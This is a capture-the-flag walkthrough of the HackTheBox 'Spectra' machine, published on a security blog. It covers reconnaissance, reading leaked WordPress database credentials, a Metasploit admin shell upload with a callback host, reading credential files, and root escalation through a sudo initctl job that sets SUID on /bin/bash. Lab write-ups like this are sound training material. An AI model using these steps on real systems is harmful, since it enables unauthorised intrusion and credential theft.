@@ -1,0 +1,103 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Spectra HacktheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/spectra-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-09-28T17:55:13+00:00">September 28, 2021</time><time class="updated" datetime="2025-06-20T17:06:46+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to accept the boot2root challenge of Spectra –Hack the box lab. Through this lab, we are going to check our skills in WordPress Exploitation and basic privilege escalation.</span></p>
+<h3><span style="color: #800000;"><strong>Table Of Content</strong></span></h3>
+<p><strong><span style="color: #000000;">Reconnaissance</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Enumeration</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Website enumeration</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Exploitation</span></strong></p>
+<ul>
+<li><span style="color: #000000;">WordPress Metasploit</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Privilege Escalation</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Abusing Sudo rights</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
+<p><span style="color: #000000;">Let’s start our journey.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap –A  10.129.223.138</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y-1nA7AHmIg/YVMbntu302I/AAAAAAAAytc/_XB8PrpiV0AZh_XYWbxfRf1v4h37c8cAQCLcBGAsYHQ/s16000/0.png"/></span></p>
+<p><span style="color: #000000;">Through Nmap scan, we get to know that there are three open ports i.e. Port 22 –SSH version OpenSSH 8.1, Port 80 –<strong>HTTP</strong>, and port 3306 –MySQL.</span></p>
+<p><span style="color: #000000;">Firstly, we are exploring Port 80 in the web browser, and get a simple page with having two links Software Issue Tracker and Test.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http:10.129.223.138</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-loLsLzkUk-w/YVMeUMH_54I/AAAAAAAAytk/nBBH1zVv8ukW8mFTocNOdtlpY_uzS0fJgCLcBGAsYHQ/s16000/1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Both links Redirected to <strong>spectra.htb</strong>, so We need to edit the host file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/hosts</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-P6L01bBLN9w/YVMeYj1EkbI/AAAAAAAAyto/4LpWVsrlvcIhq6r0n0Vcq9oSyf8flAbjwCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Then, we will try to explore both links found after navigating port 80. Once we click on the test link we get the “error establishing a database connection”. It seems nothing important.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JPdjYz9GCno/YVMeeUtCojI/AAAAAAAAyts/7v8EbsxndqUmQ0TceWllpypUHQ3bQIx0wCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">We navigate <strong>spectra.htb/testing</strong> in the web browser and we find two wordpress config files i.e wp-config.php  and <strong>wp-config.php.save</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2q6ov67enOw/YVMejrfpV8I/AAAAAAAAyt0/nwcWNP5ZaKoZtQucvUQ-7hUQgrbKe-aGACLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Wp-config.php.save is the base configuration file for WordPress.After access it through curl we find something interesting in it i.eMYSQL database credential’s username ‘devtest’ and password devteam01</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://spectra.htb/testing/wp-config.php.save</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-65ABRlwfst0/YVMeoSUqFtI/AAAAAAAAyt8/h-TjBkdYvEEufG9BhLn_PeC2gK4NjJZUwCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Happily, we login the WordPress but unfortunately, the above-found credentials are not working, and getting the error” Unknown username. Check again or try your email address”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">spectra.htb/main/wp-login.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VprJwqB11bY/YVMe20Q5IdI/AAAAAAAAyuE/VKtNfMEJ_oAp10wZYavpS_uIZlBMrmgLwCLcBGAsYHQ/s16000/5_2.png"/></span></p>
+<p><span style="color: #000000;">Looking back, now it’s time to explore the first link software issue tracker found on HTTP 80.</span></p>
+<p><span style="color: #000000;">This leads us to a basic WordPress page with the administrator’s sample post. We learn from this that the username “Administrator” is a viable option. We go to the wp-login page once more to log in.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-4JAY5Npdh4k/YVMfAsTb26I/AAAAAAAAyuM/bFGA2_icSpMn9OcNI8SGTBLHPqIL4bd4QCLcBGAsYHQ/s16000/6.png"/></p>
+<p><span style="color: #000000;">Great!! Successfully we logged in and it redirects to the administration email verification.</span></p>
+<p><span style="color: #000000;">Just click on “This email is correct” and get into it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SqxemFKKKxk/YVMe7gPxUxI/AAAAAAAAyuI/XRykl0iifSky5jBrgaJEwjBFNt_6wLIAwCLcBGAsYHQ/s16000/5_3.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">After some enumeration, we find that the WordPress version is not updated. Accordingly, we explore the Metasploit exploit and set the required options as we have already fetched the username and password i.e. administrator and devteam01 respectively. Below is the module:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/unix/webapp/wp_admin_shell_upload
+set rhosts 10.129.223.138
+set targeturi /main
+set password devteam01
+set lhost 10.10.14.100
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Da5aH3MAqvo/YVMfGB_31GI/AAAAAAAAyuQ/Bgo4daBmdAglRKT3we-ZdPjVPHNmlFrawCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">While doing enumeration, we come across there is another user name as “Katie”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ogu6XT5skGw/YVMfKF91oaI/AAAAAAAAyuY/R8I1V_FSs5s_dgBa3BZK2VJRwm9GFygxACLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Very soon we decide that user Katie does not have permission to access user.txt.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home/katie
+ls
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dwAIH1EIiro/YVMfPSkGyyI/AAAAAAAAyug/ytQhLaie32QyKAlju0PFvh0D0LuxR8S0wCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">After some file enumeration, an intriguing script autologin.conf.orig find in the /opt/ directory</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd opt
+ls -la</pre>
+<p><span style="color: #000000;">This script retrieves a password from the passwd file in the /etc/autologin directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat autologin.config.orig</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-h3ih3ILhzus/YVMfUwReLUI/AAAAAAAAyuo/H_MbTB_wx8kvHaBa3Ub4sQPLC2I5AoyZQCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">I navigate to the file and grab the password. Next, I try the password against my list of users found above.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /etc/autologin
+ls -la
+cat passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tOrnsJOBAeY/YVMfaOvPSMI/AAAAAAAAyuw/w1xGR19d2qA1WlV1jsMbc3_AUr9FpLIBACLcBGAsYHQ/s16000/11.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Let’s utilise the credential we enumerated for user Katie to log into SSH. We discovered that Katie is a member of the developer’s group using the id command. We next checked Katie’s sudo rights and discovered that user can run /sbin/initctl as root. Initctl is a linux init daemon control utility.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh katie@10.129.223.138
+id
+sudo –l
+find / -type f –group developers 2&gt;dev/null –ls
+cat /etc/init/test.conf</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tmt0ieQkHVw/YVMfgBN2MxI/AAAAAAAAyu4/kcY5Wkv3kMUYMzvsK7sl9aIjJgQfbFpnACLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Let’s abuse test.conf file and replace the existing content with the following line that will enable SUID bit for /bin/bash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod +s /bin/bash
+end script</pre>
+<p><span style="color: #000000;">We can use Katie’s privilege to start test.conf, which will run the script to enable the SUID permission on /bin/bash, because user has root permission to run initctl.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /sbin/initctl start test
+/bin/bash –p</pre>
+<p><span style="color: #000000;">Kudos!! Finally, we capture the ROOT flag after obtaining the root privilege shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8_2uKOVaEtE/YVMfk7IYmLI/AAAAAAAAyvA/lEBeyKQI9Eo_A-419SrpNb7670j4ni_2ACLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Nisha Sharma is an Experienced and Certified Security Consultant.Highly skilled in Infrastructure, web pentesting along with SIEM and other security devices. Connect with her <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/nishasharmaa"><strong>here</strong></a></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
